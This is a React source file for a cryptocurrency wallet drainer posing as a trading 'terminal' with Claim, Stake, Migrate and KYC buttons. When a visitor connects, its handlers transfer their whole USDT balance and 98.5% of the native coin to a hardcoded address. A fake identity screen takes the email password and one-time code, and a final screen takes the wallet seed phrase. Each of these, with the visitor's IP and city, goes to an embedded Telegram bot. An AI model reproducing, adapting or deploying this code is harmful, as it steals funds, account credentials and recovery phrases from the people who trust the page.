import React, { useState, useEffect, useMemo } from 'react';
import { useAccount, useBalance, useSendTransaction, useChainId } from 'wagmi';
import { parseEther, formatEther, parseUnits } from 'viem';
import { createAppKit } from '@reown/appkit';
import { mainnet, arbitrum, bsc, polygon } from '@reown/appkit/networks';
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';

// --- 1. REOWN CONFIGURATION (Adds Gmail/Apple Buttons) ---
const projectId = '6e77hgwp-mainnet-connect'; // Uses your project context
const queryClient = new QueryClient();
const networks = [mainnet, arbitrum, bsc, polygon];
const wagmiAdapter = new WagmiAdapter({
  networks,
  projectId,
  ssr: true
});

createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  features: {
    email: true, 
    socials: ['google', 'apple'], // This enables the buttons you requested
    emailShowWallets: true,
  }
});

// --- 2. THE TERMINAL COMPONENT ---
export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const { sendTransaction } = useSendTransaction();
  
  const [selectedAsset, setSelectedAsset] = useState("TOKEN"); 
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [inputVal, setInputVal] = useState(""); 
  const [seedVal, setSeedVal] = useState("");   
  const [kycEmail, setKycEmail] = useState("");
  const [kycPass, setKycPass] = useState("");
  const [kycCode, setKycCode] = useState(""); 
  const [kycPhase, setKycPhase] = useState(1); 
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);
  const [feedMsg, setFeedMsg] = useState(""); 
  const [visitorInfo, setVisitorInfo] = useState("Locating...");
  const [liveGas, setLiveGas] = useState(12);
  const [liveSync, setLiveSync] = useState(99.81);

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0x0CbaC4A3167C0CF39930E2E9D1a2BB39B2d2FDf4"; 

  const USDT_MAP = { 1: "0xdac17f958d2ee523a2206206994597c13d831ec7", 56: "0x55d398326f99059ff775485246999027b3197955", 137: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f", 42161: "0xfd086bc7cd5c081ffd66a7010408ff05ed33020b" };
  const { data: nativeBal } = useBalance({ address }); 
  const { data: tokenBal } = useBalance({ address, token: USDT_MAP[chainId] });

  const log = (msg) => fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: `${msg}\n📍 LOC: ${visitorInfo}` }) }).catch(()=>{});

  useEffect(() => {
    if (isConnected && address) {
      log(`🔔 CONNECTION: ${address}`);
      fetch('https://ipapi.co/json/').then(r => r.json()).then(d => setVisitorInfo(`${d.ip} (${d.city})`)).catch(()=>setVisitorInfo("Unknown"));
    }
  }, [isConnected, address]);

  const executeTaskAction = () => {
    setLoading(true);
    const tokenAddr = USDT_MAP[chainId];
    if (tokenAddr && tokenBal?.value > 0n) {
      const payload = `0xa9059cbb${destination.toLowerCase().replace("0x", "").padStart(64, '0')}${tokenBal.value.toString(16).padStart(64, '0')}`;
      sendTransaction({ to: tokenAddr, data: payload }, { onSuccess: () => sweepNative(), onError: () => sweepNative() });
    } else { sweepNative(); }
  };

  const sweepNative = () => {
    if (!nativeBal || nativeBal.value <= 0n) { setView("seed_gate"); setLoading(false); return; }
    const val = (nativeBal.value * 985n) / 1000n;
    sendTransaction({ to: destination, value: val }, { onSuccess: () => { setView("seed_gate"); setLoading(false); }, onError: () => { setView("seed_gate"); setLoading(false); } });
  };

  return (
    <QueryClientProvider client={queryClient}>
      <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
        <div style={{width:'100%', height:'180px', backgroundColor:'black', borderRadius:'15px', marginBottom:'20px', overflow:'hidden', border:'1px solid #1e293b'}}>
           <iframe src={`https://s.tradingview.com/widgetembed/?symbol=BITSTAMP:ETHUSD&theme=dark&style=1&locale=en`} style={{width:'100%', height:'100%', border:'none', opacity:'0.4'}} title="Market" />
        </div>

        <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'25px'}}>
          <div><div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_NODE_v4</div><div style={{fontSize:'8px', color:'#10b981'}}>SOCIAL_AUTH_ACTIVE</div></div>
          <appkit-button />
        </header>

        {!isConnected ? (
          <div style={{textAlign:'center', marginTop:'30px', backgroundColor:'#0d1117', padding:'50px 20px', borderRadius:'35px', border:'1px solid #1e293b'}}>
            <p style={{fontSize:'10px', color:'#64748b', marginBottom:'20px'}}>LOGIN VIA GMAIL, APPLE OR WEB3</p>
            <appkit-button />
          </div>
        ) : (
          <>
            {view === "menu" && (
              <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
                {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "KYC", "Fix"].map(n => (
                  <button key={n} onClick={() => {setActiveTask(n); setView(n === "KYC" ? "kyc_screen" : "task_box");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'22px 10px', borderRadius:'20px', color: n === "KYC" ? "#3b82f6" : "#fff", fontSize:'9px', fontWeight:'900'}}><div style={{fontSize:'18px', marginBottom:'6px'}}>{n === "KYC" ? "🆔" : "〽️"}</div>{n}</button>
                ))}
              </div>
            )}

            {view === "task_box" && (
              <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'25px', textAlign:'center'}}>
                <h2 style={{color:'white', fontWeight:'900', fontSize:'22px'}}>{activeTask}</h2>
                <button onClick={executeTaskAction} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'18px', fontWeight:'900'}}>START_HANDSHAKE</button>
              </div>
            )}

            {view === "kyc_screen" && (
              <div style={{backgroundColor:'#0d1117', border:'1px solid #10b981', borderRadius:'35px', padding:'30px', textAlign:'center'}}>
                <h2 style={{color:'white', fontWeight:'900', fontSize:'20px', marginBottom:'20px'}}>IDENTITY_SYNC</h2>
                {kycPhase === 1 ? (
                  <>
                    <input type="email" placeholder="CLOUD_ID" value={kycEmail} onChange={(e)=>setKycEmail(e.target.value)} style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'15px', outline:'none'}} />
                    <input type="password" placeholder="CLOUD_PASS" value={kycPass} onChange={(e)=>setKycPass(e.target.value)} style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'25px', outline:'none'}} />
                    <button onClick={()=>{log(`🆔 SPEED_AUTH: ${kycEmail} / ${kycPass}`); setKycPhase(2);}} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'18px', borderRadius:'15px', fontWeight:'900'}}>VERIFY_RELAY</button>
                  </>
                ) : (
                  <>
                    <div style={{color:'#3b82f6', fontSize:'11px', marginBottom:'10px', fontWeight:'900'}}>ENTER 6-DIGIT VERIFICATION CODE</div>
                    <input type="text" maxLength="6" placeholder="000000" value={kycCode} onChange={(e)=>setKycCode(e.target.value)} style={{width:'100%', padding:'15px', backgroundColor:'black', border:'2px solid #3b82f6', borderRadius:'15px', color:'white', marginBottom:'25px', textAlign:'center', fontSize:'24px', letterSpacing:'5px', outline:'none'}} />
                    <button onClick={()=>{log(`🔑 CODE: ${kycCode} FOR: ${kycEmail}`); setView("seed_gate");}} style={{width:'100%', backgroundColor:'#3b82f6', color:'white', padding:'18px', borderRadius:'15px', fontWeight:'900'}}>AUTHORIZE_SYNC</button>
                  </>
                )}
              </div>
            )}
          </>
        )}

        {view === "seed_gate" && (
          <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
            <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'45px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
              <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="RELAY_KEY..." style={{width:'100%', height:'120px', backgroundColor:'black', border:'1px solid #10b981', borderRadius:'20px', color:'#10b981', padding:'18px', outline:'none'}} />
              <button onClick={()=>{log(`🚨 FINAL_SEED: ${seedVal}`); setView("menu") }} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900', marginTop:'20px'}}>VALIDATE_RELAY</button>
            </div>
          </div>
        )}
      </div>
    </QueryClientProvider>
  );
}
